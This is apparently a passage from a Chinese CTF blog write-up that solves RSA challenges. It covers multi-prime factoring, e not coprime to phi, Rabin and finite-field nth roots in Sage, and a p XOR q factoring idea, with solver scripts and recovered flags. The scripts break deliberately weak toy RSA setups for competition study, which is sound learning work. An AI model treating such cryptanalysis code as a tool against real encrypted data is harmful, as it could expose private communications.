class="string">6351466082405672614085883295737944548919965310077599978190541984976106721260561511854691553565453868610374663116381728992690135579603964052096888436742489466374210302988977830209354260009636769071300547671488922280932487568494617872097079900945916095578623755388259234178268680612477377610914894710907496104362972636720911428089600646222586417255348258167381366988661303295347517753632411800607422746813905818666335896482669033027140915808983428842744482539062142710596639786508537317845758580996627882525064014450135034588736834794180287554486686075596972841883555087846775677701021701479352637748421102843822406248351476994277131337482690575095175009349909732516378330382964315421709620022837911961196685966020194554189215141758762297821318628808131301398323401698864010506849785816316875321330260285263314080063147494581040037600990836748077720670885523772728159627902311960453296092752330952130969249700776559562104117567236854526041303478039102747984668480082877982578911506991928425276445385557957750379045259124494960054574534424135407768648703579640630316936268243612044686186580389257001065198441757102217761322659630686894710273768219013265353821348563879078174064695595467864392947552655739896949699714908310000268044992892911329386425950830381092394869669909772028429264943114745575587790304248788515785473427021962255432027331143994772029825798100553275968616702208346511746136952846098000483881079268476334708733720366718979528049610330304650435684527462122705466063185641405473474636409990254433154961156119876528578589683787745161026307683732723150673756819990500536505419317277397641638885910418427679382912218056162106726030182041543254191389196695732924652812425467589000461451026805090543916784702340460053504268171601901665797607174213052404647848620139395976717777302984408101541424736063698589129484369980805581194717731469528976219054596456039278307705269184407577544084520370372269984748277291765285669123103849832742912650693589627527731652063314823281800811899078839130817382422516706798968876936676146422986085568876006217756879288536420625765537735876869140624480292479927568778211793082812927301155660252404197005435807632705417486828432680003527496336100268260013505692287715197974824293602702048074200039989010466046954319001764702167525159391165221097412507207070941040169607617565907669448292394080513719952028379907211892278587213063509785161727181094780834140425449087027374354210627478929892809387327800956442381416648762382930744745836860691652645272468710801480127383690670796702340344827232853798294566232977982518551989524593975440927239406568783391313258506866750608077495352966704970278327215482373252538685185523964815393905211818152851498336930972438448603569283564012724941434639295494863634240132261738242762708931234148319337032370483580480928554288281017282842715728356865227629594590080908396457555253561758256890799884600635571737440212394730433411857064284860111226945575837832906205884951631607279348335031910003072824224574236747404904434087096197641226369055991560801425685762426000158519701843480002622016573514879915173451468691465801627597331478760735200706227052</span></span><br><span class="line"><span class="string">14338839073210349887787514275814499181389923069109753825994309046402251</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>生成n的随机数不知道，但是可以用<a href="https://blog.csdn.net/m0_49109277/article/details/117909339?spm=1001.2014.3001.5501">欧拉函数的通式</a>绕过，配上Python的Fraction库，行家啊（其实n可以完全分解的）</p>
<p>求出phi之后发现和e是不互素的，按照一般的思路e去掉<code>(e, phi)</code>，求d解出第一层；第二层e剩下$7^{11}$，而且现在<code>(e, phi)=e</code>，直接开方就不行了，有限域也直接把我sage跑挂了</p>
<p>先记下第一层的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> Fraction</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pre</span>(<span class="params">limit</span>):</span></span><br><span class="line">    _primes = [<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">while</span> _primes[-<span class="number">1</span>] &lt; limit:</span><br><span class="line">        _primes += [next_prime(_primes[-<span class="number">1</span>])]</span><br><span class="line">    <span class="keyword">return</span> _primes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">11994856154408832550226173326306706948322784186267813285424273727457277570449721708469377333295795450316798985747411428007939478275824993378444272641075595828905331211398917692117185101479077398613046411577116685482608874046448872880344276808220924860769086887940958633441714352583855540999548720044322998264846012161431636662433683276562625027092028130005970114647137832180580174041968866569822387764690463959881397320450667236461741620403395599935845735617477280364151807003271533625363666352062617204207977554178272479567385510394164676984094113453536958667301026374275130979677305822214444335545662001110540052205079456125870487695548122936396959457217914532553325619253546791069692985512699358985463221502502084675209516472887973080192751916784600603877788797705458888760552581342959043655183973152680603248917128462709597030509958883674860205970644241146476304149515438669191043736965162506814748737378119531830170603146515955648287154128232624377713379199023238511614078806426562021069638546292232028008642595243475950555611966843590609370802372713922810842109296634261927855897749685466429848085401683729949137325841031448197225286597985926477607730381020542179177937190267395728321154320663113144417493792344192501728192224067408526468047697092815734745508911899235305415196605573552817031582341240841963500082141599736527564221706520431869455796746093434293683100803464504347573705307339278622142604231243731290546424726300181230919587809100360017180646300141932273203009540779621343752276406327270280696985946756857577522536182716290889259854732662916401670054957144740292721681742707739784073111634648716873018489059318376430379543710047917376490266767875239644497833040110744093598044604501318749065110017000755265530585848590714646543215789831321305186253110749828658194624302871154167229533880360661192631336611540590753329799514109722282049242508985274973975569128167197103339329219857542511675333185438424100205435264185442625212957816223665085393904833681032006083319868956112013073947804141313761890184012761243094669629438534487954505709858329677691050279420667276012005715403824771026942764503867179041742712964566104284721980020875049780798089586557353746689141977077518535458410939575796862938638716615803650407786897854972763793186411099146552957299304020322056573695947636353479929828321017230745880492761198924142557387134524722498789054500072958840330107186959238787198423202007480930533185363864760876539962555722806312411851288978109934860380767506470800563090423502953911794718800665163227148855219153379250626032923411536090260611564327090513624773651630139865213054047971676969921132075382597029378871818496911936273603167169708274436918974731159618512856370147955309970639864283488998194291564522716718108808644500794139567941894324821270494322487330771480736023069465090696594967014241811185428807158275522064429448212412679526940639213423056138417455582473816078505889037913398303842261835933581251153905467725831957314379762137644348555546053964035105996510374509932329977348336229876173135652873412359763033310447686419768148309532098091688546115562450592460242975433396729597685387307</span></span><br><span class="line">c = <span class="number">6351466082405672614085883295737944548919965310077599978190541984976106721260561511854691553565453868610374663116381728992690135579603964052096888436742489466374210302988977830209354260009636769071300547671488922280932487568494617872097079900945916095578623755388259234178268680612477377610914894710907496104362972636720911428089600646222586417255348258167381366988661303295347517753632411800607422746813905818666335896482669033027140915808983428842744482539062142710596639786508537317845758580996627882525064014450135034588736834794180287554486686075596972841883555087846775677701021701479352637748421102843822406248351476994277131337482690575095175009349909732516378330382964315421709620022837911961196685966020194554189215141758762297821318628808131301398323401698864010506849785816316875321330260285263314080063147494581040037600990836748077720670885523772728159627902311960453296092752330952130969249700776559562104117567236854526041303478039102747984668480082877982578911506991928425276445385557957750379045259124494960054574534424135407768648703579640630316936268243612044686186580389257001065198441757102217761322659630686894710273768219013265353821348563879078174064695595467864392947552655739896949699714908310000268044992892911329386425950830381092394869669909772028429264943114745575587790304248788515785473427021962255432027331143994772029825798100553275968616702208346511746136952846098000483881079268476334708733720366718979528049610330304650435684527462122705466063185641405473474636409990254433154961156119876528578589683787745161026307683732723150673756819990500536505419317277397641638885910418427679382912218056162106726030182041543254191389196695732924652812425467589000461451026805090543916784702340460053504268171601901665797607174213052404647848620139395976717777302984408101541424736063698589129484369980805581194717731469528976219054596456039278307705269184407577544084520370372269984748277291765285669123103849832742912650693589627527731652063314823281800811899078839130817382422516706798968876936676146422986085568876006217756879288536420625765537735876869140624480292479927568778211793082812927301155660252404197005435807632705417486828432680003527496336100268260013505692287715197974824293602702048074200039989010466046954319001764702167525159391165221097412507207070941040169607617565907669448292394080513719952028379907211892278587213063509785161727181094780834140425449087027374354210627478929892809387327800956442381416648762382930744745836860691652645272468710801480127383690670796702340344827232853798294566232977982518551989524593975440927239406568783391313258506866750608077495352966704970278327215482373252538685185523964815393905211818152851498336930972438448603569283564012724941434639295494863634240132261738242762708931234148319337032370483580480928554288281017282842715728356865227629594590080908396457555253561758256890799884600635571737440212394730433411857064284860111226945575837832906205884951631607279348335031910003072824224574236747404904434087096197641226369055991560801425685762426000158519701843480002622016573514879915173451468691465801627597331478760735200706227052</span></span><br><span class="line">e = <span class="number">14338839073210349887787514275814499181389923069109753825994309046402251</span></span><br><span class="line">primes = pre(<span class="number">100</span>)</span><br><span class="line">q = <span class="built_in">int</span>(next_prime(<span class="number">2</span> ** <span class="number">128</span>))</span><br><span class="line">phi = Fraction(<span class="built_in">int</span>(n), <span class="built_in">int</span>(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    phi *= Fraction(<span class="built_in">int</span>(q - <span class="number">1</span>), <span class="built_in">int</span>(q))</span><br><span class="line">    q = <span class="built_in">int</span>(next_prime(q))</span><br><span class="line"><span class="keyword">assert</span> phi.denominator == <span class="number">1</span></span><br><span class="line">phi = phi.numerator</span><br><span class="line">e2 = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> gcd(e, phi) != <span class="number">1</span>:</span><br><span class="line">    ex = gcd(e, phi)</span><br><span class="line">    e = e // ex</span><br><span class="line">    e2 *= ex</span><br><span class="line"><span class="comment"># step1</span></span><br><span class="line">d1 = invert(e, phi)</span><br><span class="line">m1 = <span class="built_in">pow</span>(c, d1, n)</span><br></pre></td></tr></table></figure>

<p>再次去看这篇<a href="https://blog.csdn.net/chenzzhenguo/article/details/94339659">博客</a>，发现这位师傅写的真的好，从中又有了新的思路</p>
<p>有点像CRT凑模数，但是这道题依旧不行，因为由<code>m = bytes_to_long(flag + urandom((len_ &gt;&gt; 3) - len(flag)))</code>这句话可知，flag的位数和n是很接近的，所以几乎可以说不能把n中任何一个factor去掉</p>
<p>先记录下n的完全分解吧，也暂时不知道从何下手</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># step2</span></span><br><span class="line">e = <span class="number">7</span> ** <span class="number">11</span></span><br><span class="line">c = m1</span><br><span class="line">n_exponent = []</span><br><span class="line">n_factor = []</span><br><span class="line">nn = n</span><br><span class="line">q = next_prime(<span class="number">2</span> ** <span class="number">128</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    tot = <span class="number">0</span></span><br><span class="line">    <span class="comment"># if gcd(q - 1, 7) != 1:</span></span><br><span class="line">        <span class="comment"># n_exponent.append(tot)</span></span><br><span class="line">    <span class="comment"># else:</span></span><br><span class="line">    <span class="keyword">while</span> gcd(nn, q) != <span class="number">1</span>:</span><br><span class="line">        tot += <span class="number">1</span></span><br><span class="line">        nn = nn // q</span><br><span class="line">    n_exponent.append(tot)</span><br><span class="line">    n_factor.append(<span class="built_in">int</span>(q))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#123;0&#125;^&#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(q, tot), end=<span class="string">&#x27;×&#x27;</span>)</span><br><span class="line">    q = next_prime(q)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># n = reduce(lambda x, y: x * y, [n_factor[i] ** n_exponent[i] for i in range(len(n_factor))])</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>340282366920938463463374607431768211507^2×340282366920938463463374607431768211537^13×340282366920938463463374607431768211621^13×340282366920938463463374607431768211729^11×340282366920938463463374607431768211841^7×340282366920938463463374607431768211877^7×340282366920938463463374607431768211919^11×340282366920938463463374607431768212029^2×340282366920938463463374607431768212081^2×340282366920938463463374607431768212213^13×1</p>
</blockquote>
<p>好了，做完发现才没有上次的题目，结果误闯别人萌新赛了，密码题很多，W&amp;M师傅出的题赞，只是希望他们不要打我</p>
<hr>
<p>速来填坑，终于遇见你</p>
<h3 id="AMM算法-e-phi-e"><a href="#AMM算法-e-phi-e" class="headerlink" title="AMM算法 $(e,\ phi)=e$"></a>AMM算法 $(e,\ phi)=e$</h3><p>这样$(e,\ phi)!=1$系列已经大致有一个体系了</p>
<p>Striving神的博客</p>
<p><a href="http://www.zbc53.top/archives/28/">http://www.zbc53.top/archives/28/</a></p>
<p>改之前遇到的脚本</p>
<p>la佬的博客上也有类似的</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211114101708951.png" alt="image-20211114101708951"></p>
<h2 id="困难一点点的数学0-Revenge"><a href="#困难一点点的数学0-Revenge" class="headerlink" title="困难一点点的数学0_Revenge"></a>困难一点点的数学0_Revenge</h2><p>这道题在上一题的基础上，改了下参数</p>
<hr>
<h1 id="2021第六届中国海洋大学信息安全竞赛"><a href="#2021第六届中国海洋大学信息安全竞赛" class="headerlink" title="2021第六届中国海洋大学信息安全竞赛"></a>2021第六届中国海洋大学信息安全竞赛</h1><h2 id="easyRSA"><a href="#easyRSA" class="headerlink" title="easyRSA"></a>easyRSA</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    hint = getPrime(<span class="number">1024</span>)</span><br><span class="line">    b = getPrime(<span class="number">200</span>)</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = hint * b * p + <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> isPrime(q):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">64</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(hint)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">9057141637995599750120273501711128117576789048411357158233050845658505488383724832915968443730006384810721595601723748471745315354759415044859624198755098491311647992728384572103262800310263916249536898582100747311978019829291619921741682336800665277699122504431456051606407509905004993708771825443764723285750825546500765451509998514747599779552241055519485714649825416851221219747115910385536482995890893190128149999622905611239433481756073333147782531765685320972075370276543786386451560493093416152466142374684450770169257924330366774896526508005296520372463932722237001341584625279676089901419404816917142209281664709940400762785892142918132066900664643155176180059403739</span></span><br><span class="line"><span class="string">6154079784140816887542685430803768415772730865151861643444097840023705832386679112482482248555761414705162328220586794375708796741624024822642170217210511028105715354610593613478964243640521028593911375212807872252055918567650066306345785341153202754138305812184867107836136289838379556395327458734454660336699800924390962557002402007091633450515772419925142945911576659151187043837460255245980821089671602664201100487652703989786977247616381447061677369391575649093177311422333653297000175353974295682284617873674552426804866371781198162476631361431011867016121352914491629749793369865802944046427625798032718230196065884706861662254100563745138198499719367503185424667724305</span></span><br><span class="line"><span class="string">99336867941885596246249572957476249207783802547583614060828305903417094663626785107521682819540923350225137906529404247068926777322082579296175450572566483806852214547909169221325677351559413990125595962992773728902865500358652248335066478896252289023954431595375774635699658560226625953577281314982639316733</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这里一开始我以为是一条性质理解不了，关于整除的<br>由题目可知<br>$$<br>q=hint\times b\times p+2<br>$$<br>那么我们容易得到<br>$$<br>n=p\times q=hint\times b\times p^2+2p<br>$$<br>两边除以hint取整<br>$$<br>\lfloor n/hint\rfloor=b\times p^2+\lfloor 2p/hint\rfloor=b\times p^2+0<br>$$<br>嗯对，这里不是很懂了，整数看习惯了，对于小数有点麻了，但是通过这个，之后求p和q就简单了</p>
<p>正确的理解应该是，这并不是一条所谓性质，随便搞了几个数字就知道不对；这里的解释只能说hint和p相差太大了吧，然后只能组成$n/hint$的小数部分，所以整数部分还是完全由$b\times p^2$决定的</p>
<p>一部分代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e = <span class="number">64</span></span><br><span class="line">n = <span class="number">9057141637995599750120273501711128117576789048411357158233050845658505488383724832915968443730006384810721595601723748471745315354759415044859624198755098491311647992728384572103262800310263916249536898582100747311978019829291619921741682336800665277699122504431456051606407509905004993708771825443764723285750825546500765451509998514747599779552241055519485714649825416851221219747115910385536482995890893190128149999622905611239433481756073333147782531765685320972075370276543786386451560493093416152466142374684450770169257924330366774896526508005296520372463932722237001341584625279676089901419404816917142209281664709940400762785892142918132066900664643155176180059403739</span></span><br><span class="line">c = <span class="number">6154079784140816887542685430803768415772730865151861643444097840023705832386679112482482248555761414705162328220586794375708796741624024822642170217210511028105715354610593613478964243640521028593911375212807872252055918567650066306345785341153202754138305812184867107836136289838379556395327458734454660336699800924390962557002402007091633450515772419925142945911576659151187043837460255245980821089671602664201100487652703989786977247616381447061677369391575649093177311422333653297000175353974295682284617873674552426804866371781198162476631361431011867016121352914491629749793369865802944046427625798032718230196065884706861662254100563745138198499719367503185424667724305</span></span><br><span class="line">hint = <span class="number">99336867941885596246249572957476249207783802547583614060828305903417094663626785107521682819540923350225137906529404247068926777322082579296175450572566483806852214547909169221325677351559413990125595962992773728902865500358652248335066478896252289023954431595375774635699658560226625953577281314982639316733</span></span><br><span class="line"></span><br><span class="line">bp2 = n // hint</span><br><span class="line">p = (n-hint*bp2) // <span class="number">2</span></span><br><span class="line">q = hint*bp2//p + <span class="number">2</span></span><br><span class="line"><span class="keyword">assert</span> p*q == n</span><br></pre></td></tr></table></figure>

<p>然后又是e是偶数的情况，不过显然没有前面遇到的那么容易和有现成的wp</p>
<h5 id="一般Rabin"><a href="#一般Rabin" class="headerlink" title="一般Rabin"></a>一般Rabin</h5><p>我的思路是多用了几个e=2的Rabin攻击，但感觉不对</p>
<p>借la师傅的脚本写了一下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">n = <span class="number">9057141637995599750120273501711128117576789048411357158233050845658505488383724832915968443730006384810721595601723748471745315354759415044859624198755098491311647992728384572103262800310263916249536898582100747311978019829291619921741682336800665277699122504431456051606407509905004993708771825443764723285750825546500765451509998514747599779552241055519485714649825416851221219747115910385536482995890893190128149999622905611239433481756073333147782531765685320972075370276543786386451560493093416152466142374684450770169257924330366774896526508005296520372463932722237001341584625279676089901419404816917142209281664709940400762785892142918132066900664643155176180059403739</span></span><br><span class="line">c = <span class="number">6154079784140816887542685430803768415772730865151861643444097840023705832386679112482482248555761414705162328220586794375708796741624024822642170217210511028105715354610593613478964243640521028593911375212807872252055918567650066306345785341153202754138305812184867107836136289838379556395327458734454660336699800924390962557002402007091633450515772419925142945911576659151187043837460255245980821089671602664201100487652703989786977247616381447061677369391575649093177311422333653297000175353974295682284617873674552426804866371781198162476631361431011867016121352914491629749793369865802944046427625798032718230196065884706861662254100563745138198499719367503185424667724305</span></span><br><span class="line">hint = <span class="number">99336867941885596246249572957476249207783802547583614060828305903417094663626785107521682819540923350225137906529404247068926777322082579296175450572566483806852214547909169221325677351559413990125595962992773728902865500358652248335066478896252289023954431595375774635699658560226625953577281314982639316733</span></span><br><span class="line"></span><br><span class="line">bp2 = n // hint</span><br><span class="line">p = (n-hint*bp2) // <span class="number">2</span></span><br><span class="line">q = hint*bp2//p + <span class="number">2</span></span><br><span class="line"><span class="keyword">assert</span> p*q == n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span>(<span class="params">C, P, Q, e=<span class="number">2</span></span>):</span></span><br><span class="line">    N = P * Q</span><br><span class="line">    mp = <span class="built_in">pow</span>(C, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">    mq = <span class="built_in">pow</span>(C, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">    yp = gmpy2.invert(P, Q)</span><br><span class="line">    yq = gmpy2.invert(Q, P)</span><br><span class="line">    r = (yp * P * mq + yq * Q * mp) % N</span><br><span class="line">    rr = N - r</span><br><span class="line">    s = (yp * P * mq - yq * Q * mp) % N</span><br><span class="line">    ss = N - s</span><br><span class="line">    <span class="keyword">return</span> r, rr, s, ss</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">m32 = rabin_decrypt(c, p, q)</span><br><span class="line">c16 = m32</span><br><span class="line"><span class="keyword">for</span> ct1 <span class="keyword">in</span> c16:</span><br><span class="line">    m16 = rabin_decrypt(ct1, p, q)</span><br><span class="line">    c8 = m16</span><br><span class="line">    <span class="keyword">for</span> ct2 <span class="keyword">in</span> c8:</span><br><span class="line">        m8 = rabin_decrypt(ct2, p, q)</span><br><span class="line">        c4 = m8</span><br><span class="line">        <span class="keyword">for</span> ct3 <span class="keyword">in</span> c4:</span><br><span class="line">            m4 = rabin_decrypt(ct3, p, q)</span><br><span class="line">            c2 = m4</span><br><span class="line">            <span class="keyword">for</span> ct4 <span class="keyword">in</span> c2:</span><br><span class="line">                m2 = rabin_decrypt(ct4, p, q)</span><br><span class="line">                c0 = m2</span><br><span class="line">                <span class="keyword">for</span> ct5 <span class="keyword">in</span> c0:</span><br><span class="line">                    m = rabin_decrypt(ct5, p, q)</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                        <span class="built_in">print</span>(long_to_bytes(m[i]))</span><br><span class="line">                        x += <span class="number">1</span></span><br><span class="line">                        <span class="built_in">print</span>(x)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>跑出来个锤子，屑</p>
<h5 id="有限域开方"><a href="#有限域开方" class="headerlink" title="有限域开方"></a>有限域开方</h5><p>思路戛然而止，然后在黄大佬的鼓励下竟然问到了striving师傅，师傅给的思路如下：<br>一是ta肯定了我之前的思路（六次Rabin），二抛出一个新的概念“有限域开方”，并给了一个sage脚本，之前iscc的，改下数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">p = <span class="number">9379687248080546498203772982837534815766954373570511486116083159981413417096645798856014966365034522452474187942388010149804818006063740815276649712799481</span></span><br><span class="line">q = <span class="number">965612327836309010640336991047433695556810179336511247528907945718618156107162848744574747053330490898357406242669343584421656178908998516241378530330570381491082968636749226112679273570797410328924840246087961289024973946055035418636926676076633496570175998461069029639169285927893363926033338135217150878112745316881927877175031909168645360203144573306218025903594105264560446428458045534270979754915646333544338288343648100774469601136673371680101712576187426590347035135361532767157406425958991578025201218590389525619</span></span><br><span class="line">n = <span class="number">9057141637995599750120273501711128117576789048411357158233050845658505488383724832915968443730006384810721595601723748471745315354759415044859624198755098491311647992728384572103262800310263916249536898582100747311978019829291619921741682336800665277699122504431456051606407509905004993708771825443764723285750825546500765451509998514747599779552241055519485714649825416851221219747115910385536482995890893190128149999622905611239433481756073333147782531765685320972075370276543786386451560493093416152466142374684450770169257924330366774896526508005296520372463932722237001341584625279676089901419404816917142209281664709940400762785892142918132066900664643155176180059403739</span></span><br><span class="line">c = <span class="number">6154079784140816887542685430803768415772730865151861643444097840023705832386679112482482248555761414705162328220586794375708796741624024822642170217210511028105715354610593613478964243640521028593911375212807872252055918567650066306345785341153202754138305812184867107836136289838379556395327458734454660336699800924390962557002402007091633450515772419925142945911576659151187043837460255245980821089671602664201100487652703989786977247616381447061677369391575649093177311422333653297000175353974295682284617873674552426804866371781198162476631361431011867016121352914491629749793369865802944046427625798032718230196065884706861662254100563745138198499719367503185424667724305</span></span><br><span class="line">e= <span class="number">16</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">f = x ^ e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res1 = f.roots()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">f = x ^e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">res2 = f.roots()</span><br><span class="line">m=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">        m.append(CRT(<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),p,q))</span><br><span class="line">e = <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> C <span class="keyword">in</span> m:</span><br><span class="line">    R.&lt;x&gt; = Zmod(p)[]</span><br><span class="line">    f = x ^ e - C</span><br><span class="line">    f = f.monic()</span><br><span class="line">    res1 = f.roots()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    R.&lt;x&gt; = Zmod(q)[]</span><br><span class="line">    f = x ^e - C</span><br><span class="line">    f = f.monic()</span><br><span class="line">    res2 = f.roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res1:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> res2:</span><br><span class="line">            M=CRT(<span class="built_in">int</span>(i[<span class="number">0</span>]),<span class="built_in">int</span>(j[<span class="number">0</span>]),p,q)</span><br><span class="line">            <span class="keyword">if</span> long_to_bytes(M).startswith(<span class="string">b&#x27;flag&#x27;</span>):</span><br><span class="line">                <span class="built_in">print</span>(long_to_bytes(M))</span><br></pre></td></tr></table></figure>

<img alt="easyRSA-75ae2c4a.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/easyRSA-75ae2c4a.png" width="" height="" >

<p>虽然跑了十分钟吧，但终归是出来了，好耶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;congratss_to_uooo&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Rabin-p-q-equiv1-mod-4"><a href="#Rabin-p-q-equiv1-mod-4" class="headerlink" title="Rabin $p,q\ \equiv1\ (mod\ 4)$"></a>Rabin $p,q\ \equiv1\ (mod\ 4)$</h5><p>然后返回去复现Rabin的解法，经老师提醒Rabin一般是适用p和q同模4余3（这就是我直接用Rabin写脚本出来不的原因之一吧），但是不满足该条件的网上也有相应的解法</p>
<img alt="easyRSA-34686019.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/easyRSA-34686019.png" width="" height="" >

<p>下面就是重点了，关于平方根算法的</p>
<p>简单来说一句话</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory.residue_ntheory <span class="keyword">import</span> nthroot_modnthroot_mod(c, <span class="number">2</span>, n)</span><br></pre></td></tr></table></figure>

<p>深入了解还是去看论文吧，虽然这个链接<a href="https://xz.aliyun.com/t/5113">https://xz.aliyun.com/t/5113</a>上有现成的脚本</p>
<h2 id="classical（recuring）"><a href="#classical（recuring）" class="headerlink" title="classical（recuring）"></a>classical（recuring）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *<span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *<span class="keyword">from</span> secret <span class="keyword">import</span> flagp, q = getPrime(<span class="number">1024</span>), getPrime(<span class="number">1024</span>)n = p * qe = 0x20002m = bytes_to_long(flag)c = <span class="built_in">pow</span>(m, e, n)<span class="built_in">print</span>(n)<span class="built_in">print</span>(p^q)<span class="built_in">print</span>(c)<span class="string">&#x27;&#x27;&#xx27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>代码也好简洁，就把p和q异或了一下</p>
<p>但我还是不会做</p>
<p>时隔几个月前来复现，希望能解出来</p>
<p><code>e=0x20002</code>显然是0x10001的两倍，所以先开平方根再常规没什么好说的</p>
<p>呜呜呜，学了两三个月了，还是不会做，我太菜了</p>
<p><em>然后在打第五空间的时候，发现第三题和这个好像啊。一些机缘巧合我竟然问到了出题人，师傅有一天突然加我（可能是抓到我混进萌新赛了吧），然后在很多比赛的群里没有搜到师傅的id，以为是骗子就没加，然后唔，今天手空扫了blue whale的招新群，结果发现师傅是管理员，结合我之前在他们网站上刷水题，就问他要wp，然后就被师傅骂了。骂完还是很好地向我提供了解题思路。安全圈的奇妙氛围</em></p>
<p>师傅说的后面开平方根都可以理解，就是第一步分解n，用dfs广搜从低位到高位暴力搜索，emmmmmm请教了隔壁4cm的大佬，无果。不过由此出了道$p^q$的题目</p>
<hr>
<p>第二天我冷静下来思考，发现原来是这么一回事，bb前总结一下，其实暴露了p^q就相当于暴露了p和q，凭借一定的特征通过寻找路径的算法将p和q完美地求出来</p>
<p>取p^q和n的后几位做试验</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r = 100110n = <span class="number">100111</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>最后一位是固定的没什么好说</p>
</li>
<li><p>倒数第二位因为r对应的位数是<code>1</code>，所以p和q要么是<code>01</code>要么是<code>10</code>，这里分不分类没差</p>
</li>
<li><p>倒数第三位r对应的也是<code>1</code>，先假设是<code>10</code>吧；这样推导倒数第四位是<code>0</code>，说明p和q的倒数第四位bit相同，假设是<code>00</code>，显然不行，如图</p>
</li>
</ul>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210917215229389.png" alt="image-20210917215229389"/>

<p>​    假设是<code>11</code>，同样也是不行。说明此路不通，第三步假设的<code>10</code>是错误的，应该是<code>01</code></p>
